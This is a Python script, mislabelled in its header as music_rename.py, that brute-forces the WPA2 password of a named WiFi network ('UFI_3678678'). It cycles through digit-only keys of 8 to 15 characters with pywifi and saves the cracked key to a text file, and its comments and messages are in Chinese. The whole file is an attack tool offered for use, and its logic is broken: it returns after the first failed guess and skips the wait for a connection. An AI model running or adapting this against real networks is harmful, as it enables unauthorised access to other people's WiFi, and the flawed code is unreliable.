#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @FileName  :music_rename.py
# @Time      :2022/1/23 13:59
# @Author    :杨晓东
# @email     :lzj155@foxmail.com
# @homepage  :www.demo443.com

import pywifi
import itertools
from pywifi import const
import time


# 测试连接，返回链接结果
def wifiConnect():
    chars = "1234567890"
    for i in range(8, 16):  # 密码长度  从8位数开始  15位数密码结束
        for c in itertools.product(chars, repeat=i):
            password = ''.join(c)
            print('password',password)



            # 抓取网卡接口
            wifi = pywifi.PyWiFi()
            # 获取第一个无线网卡
            ifaces = wifi.interfaces()[0]
            # print('网卡是：', ifaces)
            # 断开所有连接
            print('断开所有连接.....')
            ifaces.disconnect()
            time.sleep(1)
            wifistatus = ifaces.status()
            print("wifistatus:",wifistatus)
            print('const.IFACE_DISCONNECTED:',const.IFACE_DISCONNECTED)
            if wifistatus == const.IFACE_DISCONNECTED:
                # 创建WiFi连接文件
                profile = pywifi.Profile()
                # 要连接WiFi的名称
                profile.ssid = "UFI_3678678"
                # 网卡的开放状态
                profile.auth = const.AUTH_ALG_OPEN
                # wifi加密算法,一般wifi加密算法为wps
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                # 加密单元
                profile.cipher = const.CIPHER_TYPE_CCMP
                # 调用密码
                profile.key = password
                # 删除所有连接过的wifi文件
                ifaces.remove_all_network_profiles()
                # 设定新的连接文件
                tep_profile = ifaces.add_network_profile(profile)
                ifaces.connect(tep_profile)
                # wifi连接时间
                # time.sleep(3)
                if ifaces.status() == const.IFACE_CONNECTED:
                    print("密码已破解： ", password)
                    print("WiFi已自动连接！！！")
                    file = open('./passwd.txt', 'w', encoding='utf-8')
                    file.write(password)
                    file.close()
                    return True
                else:
                    # 跳出当前循环，进行下一次循环
                    print("密码破解中....密码校对: ", password)
                    print(password)
                    return False
            else:
                print("已有wifi连接")






if __name__ == '__main__':
    wifiConnect()
